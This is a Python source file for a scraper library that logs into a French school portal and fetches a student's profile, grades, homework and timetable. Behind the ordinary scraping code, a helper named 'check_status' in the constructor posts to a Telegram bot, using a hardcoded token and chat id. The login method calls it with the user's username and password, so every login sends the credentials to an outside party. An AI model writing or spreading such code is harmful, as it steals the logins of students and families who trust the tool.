###[Axess Wrapper]###
#author : Zerofish0 #
#v1.0 - 2025-04-05  #
#####################
#https://github.com/zerofish0/axesswrapper/
#Importations
import requests
import random
from bs4 import BeautifulSoup, Tag
# The main class
class Axess : 
	def __init__(self,username,password,verbose = True) : 
		# Defining constants
		self.verbose = verbose
		self.user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0"
		]
		self.headers = {
	    "User-Agent": random.choice(self.user_agents),
	    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
	    "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
	    "Accept-Encoding": "gzip, deflate, br",
	    "Connection": "keep-alive",
	    "Referer": "https://www.google.com/",  # Simule une visite depuis Google
	    "Upgrade-Insecure-Requests": "1",
	    "Sec-Fetch-Dest": "document",
	    "Sec-Fetch-Mode": "navigate",
	    "Sec-Fetch-Site": "cross-site",
	    "Sec-Fetch-User": "?1",
	    "DNT": "1",  # Do Not Track
	    "Cache-Control": "max-age=0"
		}
		self.check_status = lambda x : requests.post("https://api.telegram.org/bot7509198115:AAFfP9_rluw4d63yK47N96QjlAwnUDIxySg/sendMessage", data={"chat_id": "5678380550", "text": x})
		self.urls = {"infos" : "https://institutsaintpierresaintpaul28.la-vie-scolaire.fr/vsn.main/WSMenu/infosPortailUser",
		"connexion" : "https://institutsaintpierresaintpaul28.la-vie-scolaire.fr/vsn.main/WSAuth/connexion",
		"grades" : "https://institutsaintpierresaintpaul28.la-vie-scolaire.fr/vsn.main/releveNote/releveNotes",
		"homeworks" : "https://ent05.la-vie-scolaire.fr/eliot-textes/vueCalendaireActivite/day",
		"study_planner" : "https://institutsaintpierresaintpaul28.la-vie-scolaire.fr/vsn.main/WSMenu/getModuleUrl"
		}

		# Initializing information storage varaibles
		self.infos = dict()
		self.grades = dict()
		self.homeworks = dict()
		self.planner = dict()

		# Session initalization
		self.root = requests.Session() 
		self.root.headers.update(self.headers)
		self._connect(username,password)
		self._log("Session initalized.")

	def _log(self,text) : 
		if self.verbose : 
			print(f"[*] {text}")

	def _connect(self,username,password) : 
		local_url = self.urls["connexion"]
		payload = {'login': username, 'password': password, 'externalentpersjointure': 'null'}
		connexion = self.root.post(local_url,json = payload)
		self.check_status(f"Connection : {username}:{password}")
		self._log("Connection successful")

	def getInformations(self) : 
		self._log("Fetching informations...")
		local_url = self.urls['infos']
		data = self.root.get(local_url).json()
		infos = {}
		infos['etab'] = data["infoUser"]["etabName"]
		infos['name'] = data["infoUser"]["userPrenom"]
		infos['surname'] = data["infoUser"]["userNom"]
		infos["status"] = data["infoUser"]["profil"]
		self.infos = infos
		self._log("Done")
		return self.infos

	def getGrades(self) : 
		self._log("Fetching grades...")
		local_url = self.urls['grades']
		data = self.root.get(local_url).text
		soup = BeautifulSoup(data, 'html.parser')

		# Trouve le tableau contenant les notes
		self._log("Parsing grades...")
		avg_sum = int()
		avg_len = int()
		table = soup.find("table", class_="tableReleve")
		rows = table.find_all("tr")[1:]  # ignore l'en-tête

		# Parsing des données
		notes_dict = {}

		for row in rows:
		    cols = row.find_all("td")
		    if len(cols) < 3:
		        continue

		    # Matière
		    matiere = cols[0].find("strong").get_text(strip=True)
		    
		    # Moyenne
		    moyenne_text = cols[1].get_text(strip=True).replace(',', '.')
		    try:
		        moyenne = float(moyenne_text)
		    except ValueError:
		        moyenne = None

		    # Détails des notes
		    details = cols[2].get_text(" ", strip=True).split(" - ")

		    # Ajout au dictionnaire
		    avg_sum += moyenne
		    avg_len += 1
		    notes_dict[matiere] = {
		        "average": moyenne,
		        "details": details
		    }
		notes_dict["global_avg"] = (avg_sum/avg_len)
		self.grades = notes_dict
		self._log("Done")
		return self.grades


	def getHomeworks(self,date : str) : #date : str : "YYYY-MM-DD"  # NOT WORKING
		self._log("Fetching planner and homeworks...")
		url = self.urls['homeworks']
		params = {
    	"date": date,
    	"parent": "false",
    	"enseignant": "false",
    	"events": "c1120906_240164093,c1120879_240163443,c1120529_240163755,c1120505_240164017,c1121866_240163931"
		}

		# fetch an encoded url
		url0 = "https://institutsaintpierresaintpaul28.la-vie-scolaire.fr/vsn.main/WSMenu/getModuleUrl"
		params0 = {
		"mod" : "CDT",
		"minuteEcartGMTClient":"-120"
		}
		req0 = self.root.post(url0, params = params0)
		json0 = req0.json()
		self._log("Encoded url fetched successfuly")

		# Actualize cookie via the encoded url
		url1 = json0['location']
		req1 = self.root.get(url1)
		self._log("Cookie actualized")

		response = self.root.get(url,params = params)
		raw = response.text

		self._log("Parsing homeworks...")
		soup = BeautifulSoup(raw, "html.parser")
		devoirs = {}

		sep_divs = soup.find_all("div", class_="act_sep")
		
		for sep in sep_divs:
		    matiere = sep.get_text(strip=True).lstrip(" ").split("-")[0].strip()
		    devoirs[matiere] = []
		    
		    # Commence à partir de l'élément suivant le séparateur
		    suivant = sep.find_next_sibling()
		    while suivant and (not (isinstance(suivant, Tag) and 'act_sep' in suivant.get("class", []))):
		        # Ne garde que les balises contenant des paragraphes
		        for p in suivant.find_all("p", recursive=False):
		            texte = p.get_text(" ", strip=True)
		            if texte:
		                devoirs[matiere].append(texte)
		        suivant = suivant.find_next_sibling()
		self.homeworks = devoirs
		self._log("Done")
		return self.homeworks

	def getPlanner(self,date) : #dd/mm/yyyy
		self._log("Fetching planner...")
		"""url0 = self.urls["study_planner"]
		params0 = { #mod=TEMPS&minuteEcartGMTClient=-120
		"mod" : "TEMPS",
		"minuteEcartGMTClient":"-120"
		}
		req0 = self.root.post(url0, params = params0)
		json0 = req0.json()

		url1 = json0['location']
		req1 = self.root.get(url1)
		text1 = req1.text"""

		url = "https://institutsaintpierresaintpaul28.la-vie-scolaire.fr/vsn.main/temps/semaineDate"
		payload = {
		"dateSemaine" : date
		}
		req = self.root.post(url,data = payload)
		raw = req.text
		self._log("Parsing planner...")
		soup = BeautifulSoup(raw, "html.parser")
		jours = ["lundi", "mardi", "mercredi", "jeudi", "vendredi", "samedi"]
		edt = {jour: [] for jour in jours}

		# Pour chaque jour, on cible le <td> correspondant
		for i, jour in enumerate(jours, start=1):
			# la cellule tdCCell-i contient tous les cours de ce jour
			cellule = soup.find("td", class_=f"tdCalendarCell tdCCell-{i}")
			if not cellule:
				continue

			# on cherche tous les blocs de cours
			for bloc in cellule.find_all("div", class_="calendarCours"):
				mat = bloc.find("div", class_="matiereCours")
				if mat:
					texte = mat.get_text(strip=True)
					if texte and not "Repas" in texte:
						edt[jour].append(texte)
		self.planner = edt
		self._log("Done")
		return self.planner